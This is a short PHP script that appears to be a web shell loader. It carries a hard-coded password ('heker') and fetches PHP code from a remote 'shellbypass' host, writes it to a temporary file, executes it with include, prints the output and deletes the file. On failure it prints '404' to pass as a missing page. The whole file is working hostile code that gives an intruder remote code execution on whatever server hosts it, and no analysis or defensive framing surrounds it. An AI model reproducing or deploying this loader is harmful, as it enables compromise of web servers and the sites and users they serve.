<?php
// PASSWORD DEFAULT - GANTI JIKA PERLU / DEFAULT PASSWORD - CHANGE IF NECESSARY
$PASSWORD = "heker";
$VERSION = "3.1";
$url = "https://raw.shellbypass.com/txt/raw/5bc9f34697e3541dd60fb7d563c840b7";
$phpCode = file_get_contents($url);
if ($phpCode !== false) {
    $tempFile = tempnam(sys_get_temp_dir(), 'royal_') . '.php';
    file_put_contents($tempFile, $phpCode);
    ob_start();
    include $tempFile;
    $output = ob_get_clean();
    echo $output;
    unlink($tempFile);
} else {
    echo "404";
}
?>
